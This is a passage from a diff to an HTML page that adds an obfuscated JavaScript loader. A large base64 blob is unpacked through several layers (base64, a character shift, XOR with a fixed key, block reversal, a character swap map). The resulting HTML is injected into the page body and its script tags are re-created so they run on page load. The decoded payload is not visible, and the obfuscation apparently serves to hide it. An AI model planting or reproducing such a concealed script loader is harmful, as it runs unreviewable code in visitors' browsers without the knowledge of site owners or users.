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';
+    const _0xb = 'd9lfftxy';
+    function _0xc(_0xd) {
+      return decodeURIComponent(atob(_0xd).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
+    }
+    const _0xe = _0xc(_0xa);
+    function _0x11(str) {
+      const noiseMarkIndex = str.lastIndexOf('[NOISE:');
+      if (noiseMarkIndex === -1) return str;
+      const lenStart = noiseMarkIndex + 7;
+      const lenEnd = str.indexOf(']', lenStart);
+      const noiseLen = parseInt(str.slice(lenStart, lenEnd));
+      return str.slice(0, noiseMarkIndex);
+    }
+    const _0x12 = _0x11(_0xe);
+    function _0xf(_0x10) {
+      return [..._0x10].map(c => String.fromCharCode(c.charCodeAt(0) - 3)).join('');
+    }
+    const _0x13 = _0xf(_0x12);
+    function _0x14(str, key) {
+      return [...str].map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ key[i % key.length].charCodeAt(0))).join('');
+    }
+    const _0x15 = _0x14(_0x13, _0xb);
+    function _0x16(str) {
+      let res = '';
+      for (let i = 0; i < str.length; i += 4) {
+        res += str.slice(i, i+4).split('').reverse().join('');
+      }
+      return res;
+    }
+    const _0x17 = _0x16(_0x15);
+    function _0x18(str) {
+      const map = {'a':'z','z':'a','0':'9','9':'0','<':'>','>':'<','{':'}','}':'{','[':']',']':'['};
+      return [...str].map(c => map[c] || c).join('');
+    }
+    var _0x19;
+    _0x19 = _0x18(_0x17);
+    //<tcjm>       
+    const scriptContainer = document.createElement('div');
+    scriptContainer.innerHTML = _0x19;
+    const scripts = scriptContainer.querySelectorAll('script');
+    const domContent = scriptContainer.innerHTML;
+    document.body.innerHTML += domContent;
+    scripts.forEach(script => {
+      const newScript = document.createElement('script');
+      Array.from(script.attributes).forEach(attr => {
+        newScript.setAttribute(attr.name, attr.value);
+      });
+      newScript.textContent = script.textContent;
+      document.body.appendChild(newScript);
+    })
     </script>
-</body>
-</html>
+    </body>
+    </html>
